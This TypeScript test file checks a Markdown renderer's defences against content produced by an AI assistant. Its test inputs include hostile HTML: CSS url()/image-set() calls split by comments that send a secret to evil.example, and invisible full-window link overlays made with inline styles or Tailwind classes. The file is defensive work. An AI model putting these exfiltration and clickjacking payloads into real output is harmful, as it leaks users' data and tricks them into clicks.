/**
 * PPM Assistant Markdown must not make the browser fetch anything by itself, nor lay itself
 * over the page. React receives a `style` value after `style-to-js` has stripped CSS comments,
 * so a comment splitting `url` passes any test on the raw attribute and fetches on render;
 * and `style` or Tailwind classes can put an invisible full-window link over an Allow button.
 * So in Assistant content the author's `class` and `style` are removed, while what PPM's own
 * pipeline writes (KaTeX, a code block's language, footnotes) keeps its presentation. An
 * ordinary chat renders both as written.
 */
import { afterAll, describe, expect, it } from "bun:test";
import { installDom, mount, uninstallDom } from "../../helpers/react-dom";

installDom();
const { MarkdownRenderer } = await import("../../../src/web/components/shared/markdown-renderer");
afterAll(uninstallDom);

async function render(content: string, projectName: string): Promise<HTMLElement> {
  const view = await mount(<MarkdownRenderer projectName={projectName} content={content} />);
  const root = view.container.cloneNode(true) as HTMLElement;
  await view.unmount();
  return root;
}

const assistant = (content: string) => render(content, "__assistant__");
const ordinary = (content: string) => render(content, "ppm");

/** Rendered elements inside the renderer's own wrapper. */
const inner = (root: HTMLElement) => [...root.querySelectorAll(".markdown-content *")];

describe("a CSS comment inside url(", () => {
  for (const html of [
    '<div style="background: u/**/rl(https://evil.example/?k=SECRET)">x</div>',
    '<div style="background: im/**/age-set(\'https://evil.example/?k=SECRET\' 1x)">x</div>',
  ]) {
    it(`does not reach the DOM as a fetch in Assistant content: ${html}`, async () => {
      const root = await assistant(html);
      expect(root.innerHTML).not.toMatch(/url\(|image-set\(/i);
      expect(root.innerHTML).not.toContain("evil.example");
      expect(root.textContent).toContain("x");
    });
  }
});

describe("the author's class and style", () => {
  const OVERLAY_STYLE = '<a href="https://evil.example/?k=1" style="position:fixed;inset:0;z-index:2147483647;opacity:0;display:block">here</a>';
  const OVERLAY_CLASS = '<a href="https://evil.example/?k=1" class="fixed inset-0 z-50 opacity-0 block">here</a>';

  it("are removed in Assistant content, keeping the element and its text", async () => {
    for (const html of [OVERLAY_STYLE, OVERLAY_CLASS, `<div>\n\n${OVERLAY_STYLE}\n\n</div>`]) {
      const root = await assistant(html);
      const link = root.querySelector("a")!;
      expect(link.textContent).toBe("here");
      expect(link.hasAttribute("style")).toBe(false);
      expect(link.hasAttribute("class")).toBe(false);
      expect(inner(root).filter((el) => el.hasAttribute("style") || el.hasAttribute("class"))).toEqual([]);
    }
  });

  it("cannot be smuggled in by naming the provenance attribute", async () => {
    const root = await assistant('<div data-ppm-markdown-origin="guess" class="fixed inset-0" style="position:fixed">x</div>');
    const div = inner(root).find((el) => el.tagName === "DIV")!;
    expect(div.hasAttribute("class")).toBe(false);
    expect(div.hasAttribute("style")).toBe(false);
    expect(root.innerHTML).not.toContain("data-ppm-markdown-origin");
  });

  it("still work in an ordinary chat", async () => {
    const root = await ordinary(OVERLAY_CLASS + "\n\n" + '<span style="color: red">red</span>');
    expect(root.querySelector("a")?.getAttribute("class")).toBe("fixed inset-0 z-50 opacity-0 block");
    expect(root.querySelector("span")?.getAttribute("style")).toContain("color: red");
  });
});

describe("the Markdown box", () => {
  it("contains its own paint in Assistant content, so nothing inside can cover the page", async () => {
    expect((await assistant("hi")).querySelector(".markdown-content")?.className).toContain("[contain:paint]");
    expect((await ordinary("hi")).querySelector(".markdown-content")?.className).not.toContain("contain");
  });
});

describe("PPM's own presentation in Assistant content", () => {
  it("keeps KaTeX's classes and layout styles", async () => {
    const root = await assistant("$$\\frac{a}{b} + x^2$$");
    expect(root.querySelector(".katex .katex-html")).not.toBeNull();
    expect(root.querySelector(".katex-html [style]")).not.toBeNull();
  });

  it("renders maths inside author HTML", async () => {
    const root = await assistant('<div class="fixed">\n\n$$x^2$$\n\n</div>');
    expect(root.querySelector(".katex")).not.toBeNull();
    expect(root.querySelector(".fixed")).toBeNull();
  });

  it("keeps a code block's language and the footnote label's class", async () => {
    const root = await assistant("```ts\nconst a = 1;\n```\n\nnote[^1]\n\n[^1]: the note");
    expect(root.querySelector("code.language-ts, pre.shiki, .shiki-block")).not.toBeNull();
    expect(root.querySelector(".sr-only")).not.toBeNull();
    expect(root.innerHTML).not.toContain("data-ppm-markdown-origin");
  });
});
